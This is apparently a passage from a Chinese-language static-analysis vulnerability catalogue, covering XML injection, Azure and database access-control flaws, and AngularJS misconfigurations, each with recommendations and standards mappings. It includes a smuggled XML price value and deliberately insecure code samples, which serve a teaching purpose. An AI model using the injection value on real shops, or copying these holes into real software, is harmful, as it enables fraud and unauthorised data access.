<p>现在假设，在后端 Web 服务请求中包含该 XML，用于订购一双鞋。假设攻击者可以修改请求，并将 shoes 替换成 shoes<price>1.00</price><item>shoes。新的 XML 如下所示：</item></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;order&gt;</span><br><span class="line"></span><br><span class="line">    &lt;price&gt;100.00&lt;/price&gt;</span><br><span class="line"></span><br><span class="line">    &lt;item&gt;shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/order&gt;</span><br></pre></td></tr></table></figure>
<p>这样，攻击者可能只花 1 美元就可以购买一双价值 100 美元的鞋。</p>
<h5 id="RECOMMENDATIONS-47"><a href="#RECOMMENDATIONS-47" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将用户提供的数据写入 XML 时，应该遵守以下准则：</p>
<ol>
<li><p>不要使用从用户输入派生的名称创建标签或属性。</p>
</li>
<li><p>写入到 XML 之前，先对用户输入进行 XML 实体编码。</p>
</li>
<li><p>将用户输入包含在 CDATA 标签中。</p>
</li>
</ol>
<h5 id="REFERENCES-46"><a href="#REFERENCES-46" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 91 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[3] Standards Mapping - FIPS200 SI </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[6] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.10 Output Encoding and Injection Prevention Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3810 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3810 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3810 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3810 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3810 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3810 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 XML Injection (WASC-23) </p>
<h3 id="安全特性"><a href="#安全特性" class="headerlink" title="安全特性"></a>安全特性</h3><h4 id="Access-Control-Azure"><a href="#Access-Control-Azure" class="headerlink" title="Access Control: Azure"></a>Access Control: Azure</h4><h5 id="ABSTRACT-48"><a href="#ABSTRACT-48" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果在使用用户控制的值且没有适当访问控制的情形下访问 Azure Queue/Blob，则会允许攻击者查看/修改/删除未经授权的 Queue/Blob 及其消息/内容。</p>
<h5 id="EXPLANATION-48"><a href="#EXPLANATION-48" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Azure Cloud 访问控制错误在以下情况下出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于查看/修改/删除未经授权的 Queue/Blob 及其消息/内容。</p>
</li>
</ol>
<p>示例 1：以下代码可删除给定 Queue 及其消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var queueName = queryStringData[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">var queueSvc;</span><br><span class="line"></span><br><span class="line">queueSvc = azureStorage.createQueueService();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">queueSvc.deleteQueue(queueName, option, function(error, response)&#123;</span><br><span class="line"></span><br><span class="line">  if(!error)&#123;</span><br><span class="line"></span><br><span class="line">      // all the messages has been deleted</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>示例 2：以下代码可删除给定 Blob 容器及其内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var containerName = queryStringData[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">var blobSvc;</span><br><span class="line"></span><br><span class="line">blobSvc = azureStorage.createBlobService();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">blobSvc.deleteContainer(containerName, function (error, response) &#123;</span><br><span class="line"></span><br><span class="line">  if (!error) &#123;</span><br><span class="line"></span><br><span class="line">      // all the content in the given container has been deleted</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>虽然Example 1 和Example 2 中的代码会删除给定队列/Blob 容器及其属于当前用户/程序的消息/内容，但攻击者可删除该 Azure 帐户的任何队列/Blob。由于此示例中的代码不会执行检查以确保该用户/程序有权清除请求的队列/Blob，因此即使该队列/Blob 不属于当前用户/程序，它也会被清除。</p>
<h5 id="RECOMMENDATIONS-48"><a href="#RECOMMENDATIONS-48" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>禁止由不可信赖的数据来控制敏感数值。在发生此错误的许多情况下，应用程序期望获得特定于用户/程序的特定输入。如果可能的话，应用程序应仅通过输入从预定的安全数值集合中选择数据，而不是依靠输入得到期望的数值，从而确保应用程序行为得当。针对恶意输入，传递给敏感函数的数值应当是该集合中的某些安全选项的默认设置。即使无法事先了解安全数值集合，通常也可以检验输入是否在某个安全的数值区间内。若上述两种验证机制均不可行，则必须重新设计应用程序，以避免应用程序接受由用户/程序提供的潜在危险值。</p>
<h5 id="REFERENCES-47"><a href="#REFERENCES-47" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 639 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000213, CCI-001084, CCI-002165 </p>
<p>[3] Standards Mapping - FIPS200 AC </p>
<p>[4] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 4.1.2 General Access Control Design, 4.1.3 General Access Control Design, 4.1.5 General Access Control Design, 4.2.1 Operation Level Access Control </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3480.1 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3480.1 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3480.1 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3480.1 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3480.1 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3480.1 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3480.1 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[38] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02) </p>
<h4 id="Access-Control-Database"><a href="#Access-Control-Database" class="headerlink" title="Access Control: Database"></a>Access Control: Database</h4><h5 id="ABSTRACT-49"><a href="#ABSTRACT-49" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果没有适当的 access control，就会执行一个包含用户控制主键的 SQL 指令，从而允许攻击者访问未经授权的记录。</p>
<h5 id="EXPLANATION-49"><a href="#EXPLANATION-49" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Database access control 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>这个数据用来指定 SQL 查询中主键的值。</p>
</li>
</ol>
<p>示例 1：以下代码使用可转义元字符并防止出现 SQL 注入漏洞的参数化语句，以构建和执行用于搜索与指定标识符 [1] 相匹配的清单的 SQL 查询。您可以从与当前被授权用户有关的所有清单中选择这些标识符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var id = document.form.invoiceID.value;</span><br><span class="line"></span><br><span class="line">var query = &quot;SELECT * FROM invoices WHERE id = ?&quot;;</span><br><span class="line"></span><br><span class="line">db.transaction(function (tx) &#123;</span><br><span class="line"></span><br><span class="line">	tx.executeSql(query,[id]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>问题在于开发者没有考虑到所有可能出现的 id 值。虽然界面生成了属于当前用户的清单标识符列表，但是攻击者可以绕过这个界面，从而获取所需的任何清单。由于此示例中的代码没有执行检查以确保用户具有访问所请求清单的权限，因此它会显示任何清单，即使此清单不属于当前用户。</p>
<h5 id="RECOMMENDATIONS-49"><a href="#RECOMMENDATIONS-49" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>与其靠表示层来限制用户输入的值，还不如在应用程序和数据库层上进行 access control。任何情况下都不允许用户在没有取得相应权限的情况下获取或修改数据库中的记录。每个涉及数据库的查询都必须遵守这个原则，这可以通过把当前被授权的用户名作为查询语句的一部分来实现。</p>
<p>示例 2：以下代码实现的功能与Example 1 相同，但是附加了一个限制，以验证清单是否属于当前经过身份验证的用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var id = document.form.invoiceID.value;</span><br><span class="line"></span><br><span class="line">var user = document.form.user.value;</span><br><span class="line"></span><br><span class="line">var query = &quot;SELECT * FROM invoices WHERE id = ? AND user = ?&quot;;</span><br><span class="line"></span><br><span class="line">db.transaction(function (tx) &#123;</span><br><span class="line"></span><br><span class="line">	tx.executeSql(query,[id,user]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-48"><a href="#REFERENCES-48" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 566 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000213, CCI-001084, CCI-002165 </p>
<p>[4] Standards Mapping - FIPS200 AC </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 4.1.2 General Access Control Design, 4.1.3 General Access Control Design, 4.1.5 General Access Control Design, 4.2.1 Operation Level Access Control, 13.4.2 GraphQL and other Web Service Data Layer Security Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[22] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 863 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3480.1 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3480.1 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3480.1 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3480.1 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3480.1 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3480.1 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3480.1 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02) </p>
<h4 id="AngularJS-Misconfiguration-Dangerous-Protocol-Allowed"><a href="#AngularJS-Misconfiguration-Dangerous-Protocol-Allowed" class="headerlink" title="AngularJS Misconfiguration: Dangerous Protocol Allowed"></a>AngularJS Misconfiguration: Dangerous Protocol Allowed</h4><h5 id="ABSTRACT-50"><a href="#ABSTRACT-50" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序允许 JavaScript 成为允许使用的协议，这可能会引发 cross-site scripting 漏洞。</p>
<h5 id="EXPLANATION-50"><a href="#EXPLANATION-50" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>某些框架（例如 AngularJS）将限制可能为指向其他站点和图像的链接设置的协议。这主要是为了阻止内联 JavaScript 运行，因为其运行可能会导致应用程序中出现其他的 cross-site scripting 漏洞。</p>
<p>示例 1：以下代码更改了 AngularJS 中的默认白名单协议，以允许图像 HTML 元素允许内联 JavaScript。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">myModule.config(function($compileProvider)&#123;</span><br><span class="line"></span><br><span class="line">    $compileProvider.imgSrcSanitizationWhitelist(/^(http(s)?|javascript):.*/);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-50"><a href="#RECOMMENDATIONS-50" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>几乎没有理由用此方式内联 JavaScript，因此不应允许 JavaScript 在默认被禁止的位置内联运行。通常会有更简洁、更安全的方法来运行相同功能，而无需在应用程序中开放潜在的安全漏洞。</p>
<h5 id="REFERENCES-49"><a href="#REFERENCES-49" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] AngularJS $compileProvider documentation Google</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="AngularJS-Misconfiguration-Strict-Contextual-Escaping-Disabled"><a href="#AngularJS-Misconfiguration-Strict-Contextual-Escaping-Disabled" class="headerlink" title="AngularJS Misconfiguration: Strict Contextual Escaping Disabled"></a>AngularJS Misconfiguration: Strict Contextual Escaping Disabled</h4><h5 id="ABSTRACT-51"><a href="#ABSTRACT-51" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 AngularJS 1 应用程序中禁用严格上下文转义，可能会导致多个新的漏洞。</p>
<h5 id="EXPLANATION-51"><a href="#EXPLANATION-51" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>严格上下文转义 (SCE) 是 AngularJS 应用程序中的一种机制，可帮助保护应用程序免受攻击者攻击，阻止一整套不同攻击手段的多种漏洞。最突出的是，其可阻止某些类型的 cross-site scripting 攻击。在此应用程序中，此保护机制已被禁用。</p>
<p>示例 1：在此示例中，我们在一个模块上禁用了 SCE。</p>
